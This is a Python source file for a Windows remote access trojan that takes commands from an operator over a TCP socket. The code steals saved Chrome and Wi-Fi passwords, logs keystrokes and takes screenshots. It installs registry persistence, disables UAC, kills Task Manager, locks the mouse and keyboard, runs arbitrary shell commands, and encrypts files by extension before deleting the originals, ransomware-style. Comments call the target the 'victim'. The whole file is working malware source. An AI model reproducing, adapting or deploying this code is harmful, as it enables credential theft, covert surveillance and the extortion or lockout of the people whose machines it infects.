import sys
import os
import socket
import subprocess
import string
import shutil
import winreg as wreg
import time
import random
import pythoncom
import pyHook
import win32api
import platform
import pyautogui
import ctypes
import mimetypes
import base64
import smtplib
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
import win32gui
import win32con
import threading
import logging
from pynput.keyboard import Key, Listener
import keyboard
import ntpath
import hashlib
from Cryptodome.Cipher import DES
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from Cryptodome.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet
import cv2
import re
import json
import urllib3
import encodings.idna
import sqlite3
import win32crypt
from pathlib import Path
from ldap3 import Server, Connection, ALL, NTLM, ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES, AUTO_BIND_NO_TLS, SUBTREE
from ldap3.core.exceptions import LDAPCursorError

#CHANGE FILE NAMES FOR PERSISTENCE BEFORE RUNNING!!!!

def start():
    
    t1 = threading.Thread(target = main)
    t2 = threading.Thread(target = keylogger)
    t3 = threading.Thread(target = killTM)

    t1.start()
    t2.start()
    t3.start()
    t1.join()
    t2.join()
    t3.join()
    return()
    
def connect():
    
    sct = socket.socket()
    port = 44445
    selfip = socket.gethostbyname(socket.gethostname())
    ip = '192.168.X.X'
    sct.connect((selfip, port))
    key = sct.recv(8192).decode()
    #print(key)

    try:
        name = 'TCPClient.exe'
        path = os.getenv('APPDATA')
        sct.send('Finding File...'.encode())
        sct.recv(512).decode()
        
        if os.path.exists(path + '/' + name):
            sct.send('File Found'.encode())
            sct.recv(512).decode()
            
        else:
            for root, dirs, files in os.walk('C:\\', topdown = True):
                if name in files:
                    file = (os.path.join(root,name))
                    shutil.move(file, path + '/' + 'TCPClient.exe')
                    sct.send('File Successfully Moved'.encode())
            else:
                sct.send('File Not Located On System. Is It Installed?'.encode())
                sct.recv(512).decode()
            
    except Exception as ex:
        print(ex)
        
    try:
        pcname = (socket.getfqdn())
        username = (os.getlogin())
        fullname = (pcname + '/' + username)
        sct.send(selfip.encode())
        sct.recv(512).decode()
        http = urllib3.PoolManager()
        url = http.request("GET","http://ipinfo.io/json")
        data = json.loads(url.data.decode('utf-8'))
        IP = data['ip']
        org = data['org']
        city = data['city']
        region = data['region']
        country = data['country']
        region = data['region']
        location = city + ' ' + region + ' ' + country
        sct.send(location.encode())
        sct.recv(512).decode()
        sct.send(fullname.encode())
        sct.recv(512).decode()
    except Exception as ex:
        print(ex)
        
    while True:
        command = sct.recv(8192)
        #print(command.decode())
        dec = str_xor(command.decode(), key)
        #print(dec)
        
        if 'exit' in dec:
            return 1
            break
#---------------------------------------------------------------------
        elif 'upload' in dec: #Uploads Files to the victim machine
            upload, path = dec.split(' ')
            prepath = os.getenv('APPDATA')
            path = ntpath.basename(path)
            f = open(prepath + '/' + path, 'wb')
            while True:
                bits = sct.recv(1024)
                if bits.endswith('DONE'.encode()):
                    f.write(bits[:-4])
                    f.close()
                    print('Upload Complete')
                    break
                f.write(bits)

        elif 'dirup' in dec: #Uploads Directories to the victim machine
            try:
                newfiles = []
                directory, path = dec.split(' ')
                folder = sct.recv(1024).decode()
                sct.send(' '.encode())
                files = sct.recv(4092).decode()
                newfile = files.split(',')
                for each in newfile:
                    newfiles.append(each)
                newfiles = [i.strip('[]\' \'') for i in newfiles]
                prepath = os.getenv('APPDATA')
                os.mkdir(prepath + '\\' + folder)
                directory = (prepath + '\\' + folder)
                for file in newfiles:
                    writefile = open(directory + '\\' + file, 'w+b')
                    while True:
                        bits = sct.recv(1024)
                        if bits.endswith('DONE'.encode()):
                            writefile.write(bits[:-4])
                            writefile.close()
                            print('file done')
                            break
                        writefile.write(bits)
                    writefile.close()
            except Exception as e:
                print(e)
            
            
        elif 'download' in dec: #Downloads Files from the victim machine
            download, path = dec.split(' ')
            try:
                if os.path.exists(path):
                    f = open(path, 'rb')
                    packet = f.read(1024)
                    while len(packet) > 0:
                        sct.send(packet)
                        packet = f.read(1024)
                    sct.send("DONE".encode())
                else:
                    sct.send("File not found".encode())
            except Exception as ex:
                sct.send("Failed to connect to download function".encode())

        elif 'runpersistence' in dec: #When running client as .exe, this function installs 2 registry keys that run the program each tim the victim machine is restarted and also runs the program as admin
            path = os.getcwd().strip('/n')
            environ = os.getenv('APPDATA')
            environment = environ + '\\' + 'TCPClient.exe'
            keyval = 'Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers'
            try:
                Null, userprof = subprocess.check_output('set USERPROFILE', shell = True, stdin=subprocess.PIPE,stderr=subprocess.PIPE).decode().split('=')
                destination = environment
                key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Software\Microsoft\Windows\CurrentVersion\Run', 0, wreg.KEY_ALL_ACCESS)
                wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
                key.Close()
            except Exception as ex:
                #print(ex)
                sct.send('broken'.encode())
            try:
                newkey = wreg.OpenKey(wreg.HKEY_CURRENT_USER, keyval, 0, wreg.KEY_ALL_ACCESS)
                wreg.SetValueEx(newkey, environment, 0, wreg.REG_SZ, '~ RUNASADMIN')
                wreg.CloseKey(newkey)
            except Exception as ex:
                #print(ex)
                sct.send('Persistence Installed'.encode())
            
        elif 'cd' in dec: #Change directory on victim machine
            code, directory = dec.split('*')
            try:
                os.chdir(directory)
                sct.send((os.getcwd()).encode())
            except Exception as ex:
                sct.send((str(ex)).encode())

        elif 'arptables' in dec: #Print victim arptables
            arpd = subprocess.check_output(['arp','-a'])
            arp = arpd.decode('ascii')
            #print(arp)
            sct.sendall(arp.encode())
#----------WIP--------------WIP---------------WIP-----------WIP-------------WIP-----------WIP----------WIP
        elif dec == 'checkcams': #Not currently working-Will be able to view victim machine camera feed
            try:
                source = 0
                cap = cv2.VideoCapture(source)
                if cap is None or not cap.isOpened():
                    print('Unable to open video source:', source)
                else:
                    while True:
                        ret, frame = cap.read()
                        frame = cv2.resize(frame, None, fx=0.5, fy=0.5, interpolation=cv2.INTER_AREA)
                        cv2.imshow('Input',frame)
                        c = cv2.waitKey(1)
                        if c == 27:
                            break
                    cap.release()
                    cv2.destroyAllWindows()
#--------------------------------------------------------------------------------------------------------------
            except Exception as ex:
                print(ex)

        elif dec == 'chromepasswords': #Steals any saved chrome passwords
            message = "Executed Successfully"
            chromestealer(sct)
            sct.send(message.encode())

        elif dec == 'curl': #Allows files to be curled onto victim machine
            sct.send('Enter link'.encode())
            link = sct.recv(1024).decode()
            subprocess.check_output(['curl', link])

        elif dec == 'decrypt': #decryption function for any files you have encrypted.
            rsakeycode = ''
            rando = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(4))
            index = -1
            folderarray = []
            direc = os.getenv('APPDATA')
            file = direc + '/' + 'privatekey.bin'
            sct.send('Input file extension for decrypting'.encode())
            ext = sct.recv(1024)
            extension = ext.decode()
            for root, dirs, files in os.walk('C:\\', topdown = True):
                for name in files:
                    if extension and name.endswith('.' + extension):
                        index += 1
                        data = (os.path.join(root, name))
                        folderarray.append(data)
            try:
                for i in range(len(folderarray)):
                    end = (os.path.splitext(folderarray[i]))
                    with open(folderarray[i], 'rb') as fobj:
                        private_key = RSA.import_key(open(file).read(),passphrase = rsakeycode)
                        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)
                                                                  for x in
                                                                   (private_key.size_in_bytes(),
                                                                           16,16,-1)]

                        cipher_rsa = PKCS1_OAEP.new(private_key)
                        session_key = cipher_rsa.decrypt(enc_session_key)
                        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
                        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
                        f = open(direc + '/' + 'unencrypted' + rando + end[1],  'w+b')
                        f.write(data)
                        f.close()
            except Exception as ex:
                sct.send('broken'.encode())

        elif 'disableuac' in dec: #Disables victim machine UAC
            try:
                success = "Executed Successfully"
                subprocess.check_output(['reg.exe','ADD','HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/t','REG_DWORD','/d','0','/f'])
                sct.send(success.encode())
            except Exception as ex:
                error = "Unsuccessful Execution"
                sct.send(error.encode())

        elif 'driveinfo' in dec: #Lists victim machine's drives
            drives = win32api.GetLogicalDriveStrings()
            drives = drives.split('\000')[:-1]
            drives = str(drives)
            sct.send(drives.encode())

        elif dec == 'domainusers': #Query LDAP to find domain users if you have a domain account
            sct.send('Input LDAP Server Name or IP Address'.encode())
            servername=sct.recv(1024).decode()
            sct.send('Input Domain Name'.encode())
            domainname = sct.recv(1024).decode()
            sct.send('Input Domain User Name'.encode())
            domainuser = sct.recv(1024).decode()
            sct.send('Input Domain User Password'.encode())
            domainpass = sct.recv(1024).decode()
            domain = domainname.split('.')
            searchlist = []
            for each in range(len(domain)):
                searchterm = ('dc='+domain[each])
                searchlist.append(searchterm)
            i = 0
            if len(searchlist) == 3:
                searchphrase = (searchlist[i] + ',' + searchlist[i+1] + ',' + searchlist[i+2])
            elif len(searchlist) == 2:
                searchphrase = (searchlist[i] + ',' + searchlist[i+1])
            else:
                sct.send('Cant Complete Search'.encode())

            server = Server(servername,get_info = ALL)
            conn = Connection(server, user = (domainname+'\\'+domainuser), password = domainpass, authentication = NTLM, auto_bind = True)
            conn.search((searchphrase),'(objectclass = person)')
            sct.send(str(conn.entries).encode())

        elif 'enableuac' in dec: #Enables victim machine UAC
            try:
                success = "Executed Successfully"
                subprocess.check_output(['reg.exe','ADD','HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System','/v','EnableLUA','/t','REG_DWORD','/d','1','/f'])
                sct.send(success.encode())
            except Exception as ex:
                error = "Unsuccessful Excution"
                sct.send(error.encode())

        elif dec == 'encrypt': #Encryption function to encrypt victim machine files based on file extension
            index = -1
            folderarray = []
            end = []
            path = os.getenv('APPDATA')
            sct.send("Input file extension for encrypting".encode())
            ext = sct.recv(1024)
            extension = ext.decode()
            for root, dirs, files in os.walk('C:\\', topdown = True):
                for name in files:
                    if extension and name.endswith(extension):
                        index += 1
                        data = (os.path.join(root, name))
                        folderarray.append(data)
            for i in range(len(folderarray)):
                try:
                    file = folderarray[i]
                    final = (file.split('\\'))
                    end = (os.path.splitext(folderarray[i]))
                    filename = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(8))
                    with open(path + '/' + filename + end[1], 'ab') as out_file: 
                        recipient_key = RSA.import_key(open(path + '\\' + 'publickey.bin').read())
                        session_key = get_random_bytes(16)
                        cipher_rsa = PKCS1_OAEP.new(recipient_key)
                        out_file.write(cipher_rsa.encrypt(session_key))
                        cipher_aes = AES.new(session_key, AES.MODE_EAX)
                        pfile = open(folderarray[i], 'rb')
                        data = pfile.read()
                        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
                        out_file.write(cipher_aes.nonce)
                        out_file.write(tag)
                        out_file.write(ciphertext)
                        out_file.close()
                        pfile.close()
                        os.remove(folderarray[i])
                except Exception as ex:
                    sct.send('broken'.encode())

        elif 'firewallstatus' in dec: #Prints state of victim firewall
            try:
                fire = subprocess.check_output(['netsh', 'firewall', 'show', 'state'])
                results = fire.decode('ascii')
                sct.send(results.encode())
            except Exception as ex:
                fail = 'Unsuccessful Execution'
                sct.send(fail.encode())

        elif dec == 'generatekeys': #Generate RSA keys for encryption and decryption of files on victim machine
            try:
                key = RSA.generate(4096)
                encrypted_key = key.export_key(pkcs=8, protection='scryptAndAES128-CBC')
                with open('privatekey.bin', 'wb') as keyfile:
                    keyfile.write(encrypted_key)
                    keyfile.close()
                with open ('publickey.bin', 'wb') as keyfile:
                    keyfile.write(key.publickey().export_key())
                    keyfile.close()

                path = os.getenv('APPDATA')
                shutil.move('privatekey.bin' , path + '/' + 'privatekey.bin')
                shutil.move('publickey.bin' , path + '/' + 'publickey.bin')
                sct.send('Keys Created'.encode())
            except Exception as ex:
                sct.send("Failure To Create Keys".encode())

        elif dec == 'getwifinetworks': #Shows available wifi networks for victim machine
            try:
                wifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
                results = wifi.decode('ascii')
                results = results.replace('\r','')
                wa = results.split('\n')
                wa = wa[4:]
                SSID = []
                count = 0
                while count < len(wa):
                    SSID.append(wa[count])
                    count += 1
                counter = 0
                while counter < 5:
                    del SSID[0]
                    counter += 1
                sct.send(str(SSID).encode())
            except Exception as Ex:
                error = 'There are no wireless networks available\n'
                sct.send(error.encode())

        elif 'getwifipasswords' in dec: #Steals victim machine wifi passwords for a particular wifi network
            try:
                sct.send('Enter Wifi'.encode())
                wifi = sct.recv(1024).decode()
                pw = subprocess.check_output(['netsh','wlan','show','profile','name='+ wifi,'key=clear'])
                pwd = pw.decode('ascii')
                sct.send(pwd.encode())
            except Exception as Ex:
                error = 'There are no available networks to pull passwords from\n'
                sct.send(error.encode())

        elif 'isadmin' in dec: #Checks if the logged in user is a local administrator
            try:
                adstatus = (ctypes.windll.shell32.IsUserAnAdmin())
                admstatus = ('Is Admin:' + ' ' + str(adstatus))
                sct.send(admstatus.encode())
            except Exception as ex:
                error = "Unable to determine admin status" 
                sct.send(error.encode())

        elif 'killall' in dec: #Kills both mouse and keyboard input on victim machine
            hookman = pyHook.HookManager()
            hookman.MouseAll = eventfalse
            hookman.KeyAll = eventfalse
            hookman.HookMouse()
            hookman.HookKeyboard()
            pythoncom.PumpWaitingMessages()
            response = 'executed successfully'
            sct.send(response.encode())

        elif 'killmouse' in dec: #Kills mouse input on victim machine
            hookman = pyHook.HookManager()
            hookman.MouseAll = eventfalse
            hookman.HookMouse()
            pythoncom.PumpMessages()
            response = 'executed successfully'
            sct.send(response.encode())

        elif 'killkeyboard' in dec: #Kills keyboard input on victim machine
            hookman = pyHook.HookManager()
            hookman.KeyAll = eventfalse
            hookman.HookKeyboard()
            pythoncom.PumpMessages()
            response = 'executed successfully'
            sct.send(response.encode())

        elif 'ls' in dec: #Prints directory contents of current directory
            direc = subprocess.check_output(['dir'], shell=True)
            dire = direc.decode('ascii')
            sct.send(dire.encode())

        elif 'netusers' in dec: #Runs netusers on victim machine and displays result
            try:
                acc = subprocess.check_output(['net','users'])
                netacc = acc.decode('ascii')
                sct.send(netacc.encode())
            except:
                fail = 'Execution Failure'
                sct.send(fail.encode())

        elif dec == 'pcinfo': #Shows information about victim machine
            try:
                sys = (platform.system())
                cpu = (platform.processor())
                pcname = (socket.gethostname())
                username = (os.getlogin())
                fullname = (pcname + '/' + username)
                sct.send(fullname.encode())
            except Exception as ex:
                print(ex)

        elif 'pwd' in dec: #prints current working directory on victim machine
            cdirec = subprocess.check_output(['cd'], shell=True)
            cdire = cdirec.decode('ascii')
            sct.send(cdire.encode())

        elif 'restart' in dec: #Restarts victim machine
            if platform.system() == 'Windows':
                os.system('shutdown -t 0 -r -f')
            elif platform.system() == 'Linux':
                os.system('shutdown -r now')

        elif 'reviveall' in dec: #Revives mouse and keyboard use on victim machine
            hookman = pyHook.HookManager()
            hookman.MouseAll = eventtrue
            hookman.KeyAll = eventtrue
            response = 'executed successfully'
            sct.send(response.encode())

        elif 'scan' in dec: #Rudimentary port scanner to be used on victim machine
            command = dec[5:]
            ip, ports = command.split(':')
            scan_result = ''
            for port in ports.split(','):
                try:
                    sock = socket.socket()
                    output = sock.connect_ex((ip, int(port)))
                    if output == 0:
                        scan_result = scan_result + ' Port ' + port + ' is opened' + '\n'
                    else:
                        scan_result = scan_result + ' Port ' + port + ' is closed' + '\n'
                        sock.close()
                except Exception as ex:
                    pass
            sct.send(scan_result.encode())

        elif dec == 'screenshot': #Takes screenshot of victim screen
            screenshot(sct)

        elif 'sendlog' in dec: #sends keylogger file to attacker(NOT CURRENTLY WORKING)
            t3 = threading.Thread(target = send_log, args=[sct])
            t3.start()
            t3.join()

        elif 'sendscreenshot' in dec: #Sends screenshots to attacker
            send_screenshot(sct)

        elif 'shutdown' in dec: #Shuts down victim machine
            if platform.system() == 'Windows':
                os.system('shutdown /s /t 1')
            elif platform.system() == 'Linux':
                os.system('shutdown -h now')

        elif 'sleep' in dec: #Puts victim machine to sleep
            try:
                message = "Executed Successfully"
                os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                sct.send(message.encode())
            except Exception as ex:
                ex = failmessage
                sct.send(failmessage.encode())

        elif 'whoami' in dec: #Runs whoami command on victim machine
            try:
                whoami = subprocess.check_output(['whoami'])
                who = whoami.decode('ascii')
                sct.send(who.encode())
            except Exception as ex:
                print(ex)

        elif 'phelp' in dec: #Lists currently implemented modules
            phelp(sct)
                
        else:
            cmd = subprocess.Popen(dec, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            sct.send(cmd.stdout.read())
            sct.send(cmd.stderr.read())
#---------------------------------------------------------------------------------------------------------
def keylogger():
    prepath = os.getenv('APPDATA')
    logfile = (prepath + '\\KeyLogger.txt')
    logging.basicConfig(filename=logfile, level=logging.DEBUG, format = '%(message)s')
    with Listener(on_press=on_press) as listener:
        listener.join()

def killTM():
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        while True:
            subprocess.call('taskkill /f /im taskmgr.exe', startupinfo = si)
            time.sleep(1)
    except Exception as ex:
        print(ex)

def on_press(key):
    logging.info(str(key))

def str_xor(s1, s2):
    return "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1,s2)])

def phelp(sct):
    message = '\n Command Help:\n ipconfig: Check victim IP addresses\n netusers: Check user accounts on machine\n killall: Disable Mouse and Keyboard\n startkeylogger: Starts a keylogger\n reviveall: Enables Mouse and Keyboard\n killmouse: Disables Mouse Control\n killkeyboard: Disables Keyboard Functionality\n restart: Restart Victim Machine\n shutdown: Shutdown Victim Machine\n getwifinetworks: Show Wifi Networks the Victim has accessed\n getwifipasswords: Show Passwords for Wifi Networks\n arptables: Show Victim Arptables\n sendlog: Send Keylog File to email\n chromepasswords: Gather Victim Chrome Passwords\n disableav: Disable Victim Windows Defender(Requires special perms)\n disableuac: Disable Victim User Account Control\n enableuac: Enable Victim User Account Control\n isadmin: Check if client is running as admin\n ls: List the current directory files\n pwd: Print the current working directory\n screenshot: Take a screenshot of the primary display\n sendscreenshot: Send the screenshot of your choice to email\n firewallstatus: Check firewall status of victim\n curl: curl<link> -O <output> to download link contents to working directory\n Encrypt: Encrypt user files by extension\n Decrypt: Decrypt user files based on extension\n runpersistence: Set registry keys to enable persistence\n driveinfo: Gather information about victims drives\n pcinfo: Gather information about victims OS\n generatekeys: Generate RSA keys for encryption and decryption\n'
    sct.send(message.encode())
    return()

def screenshot(sct):
    count = 'Please number your shot'
    sct.send(count.encode())
    number = sct.recv(1024)
    count = number.decode()
    path = os.getenv('APPDATA')
    pic = pyautogui.screenshot()
    pic.save(path + '/' + 'screenshot' + count + '.png')
    message = 'successful execution'
    sct.send(message.encode())

def send_log(sct):
    prepath = os.getenv('APPDATA')
    path = (prepath + '\\KeyLogger.txt')
    emailfrom = ""
    emailto = ""
    fileToSend = path
    imageToSend = ''
    username = ""
    password = ""

    msg = MIMEMultipart()
    msg["From"] = emailfrom
    msg["To"] = emailto
    msg["Subject"] = "Keylogfile"
    msg.preamble = "help I cannot send an attachment to save my life"

    ctype, encoding = mimetypes.guess_type(fileToSend)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"

    maintype, subtype = ctype.split("/", 1)

    if maintype == "text":
        fp = open(fileToSend)
        # Note: we should handle calculating the charset
        attachment = MIMEText(fp.read(), _subtype=subtype)
        fp.close()
    elif maintype == "image":
        fp = open(imageToSend, "rb")
        attachment = MIMEImage(fp.read(), _subtype=subtype)
        fp.close()
    else:
        fp = open(fileToSend, "rb")
        attachment = MIMEBase(maintype, subtype)
        attachment.set_payload(fp.read())
        fp.close()
        encoders.encode_base64(attachment)
    attachment.add_header("Content-Disposition", "attachment", filename=fileToSend)
    msg.attach(attachment)
        
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(username, password)
    except Exception as ex:
        print("Auth Failure")

    try:
        server.sendmail(emailfrom, emailto, msg.as_string())
        server.close()
        print("Sent Successfully")
    except Exception as ex:
        print("Failure to Send")

    message = "Executed Successfully"
    sct.send(message.encode())

    return()

def send_screenshot(sct):
    cmessage = "Enter the number of the screenshot you would like"
    sct.send(cmessage.encode())
    number = sct.recv(256)
    count = number.decode()
    emailfrom = 'thisrandomguy@gmail.com'
    et = sct.send("Enter the receiver email".encode())
    emailto = sct.recv(1024).decode()
    path = os.getenv('APPDATA')
    imageToSend = (path + '/' + 'screenshot' + count + '.png')
    username = sct.send('Enter the sender email'.encode())
    username = sct.recv(1024).decode()
    pwd = sct.send("Enter Your Password".encode())
    passwd = sct.recv(1024)
    password = passwd.decode()

    msg = MIMEMultipart()
    msg["From"] = emailfrom
    msg["To"] = emailto
    msg["Subject"] = "screencaps"
    msg.preamble = "help I cannot send an attachment to save my life"

    ctype, encoding = mimetypes.guess_type(imageToSend)
    if ctype is None or encoding is not None:
        ctype = "application/octet-stream"

    maintype, subtype = ctype.split("/", 1)

    if maintype == "image":
        fp = open(imageToSend, "rb")
        attachment = MIMEImage(fp.read(), _subtype=subtype)
        fp.close()
    else:
        fp = open(fileToSend, "rb")
        attachment = MIMEBase(maintype, subtype)
        attachment.set_payload(fp.read())
        fp.close()
        encoders.encode_base64(attachment)
    attachment.add_header("Content-Disposition", "attachment", filename=imageToSend)
    msg.attach(attachment)
        
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(username, password)
    except Exception as ex:
        sct.send('broken'.encode())

    try:
        server.sendmail(emailfrom, emailto, msg.as_string())
        server.close()
    except Exception as ex:
        sct.send('broken'.encode())

    message = "Executed Successfully"
    sct.send(message.encode())

    return()

def eventfalse(event):
    return False

def eventtrue(event):
    return True

def chromestealer(sct):
    info_list = []
    path = os.getenv('localappdata') + \
            '\\Google\\Chrome\\User Data\\Default\\'
    try:
        connection = sqlite3.connect(path + "Login Data")
        with connection:
            cursor = connection.cursor()
            v = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            value = v.fetchall()

        if (os.name == "posix") and (sys.platform == "darwin"):
            #print("Mac OSX not supported.")
            sys.exit(0)

        for origin_url, username, password in value:
            if os.name == 'nt':
                password = win32crypt.CryptUnprotectData(
                    password, None, None, None, 0)[1]
            
            if password:
                info_list.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)
                })
        #print(info_list)
        sct.send(str(info_list).encode())
        return()
    
    except Exception as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
            return()
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
            return()
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
            return()
        else:
            print(e)
            return()


def main():
    while True:
        try:
            if connect() == 1:
                break
        except:
            time.sleep(int(0.25))
            pass
        
'''wnd = ctypes.windll.kernel32.GetConsoleWindow()
if wnd != 0:
    ctypes.windll.user32.ShowWindow(wnd, win32con.SW_HIDE)
    ctypes.windll.kernel32.CloseHandle(wnd)'''

start()
            
#---------------------------------------------------------------------------
    
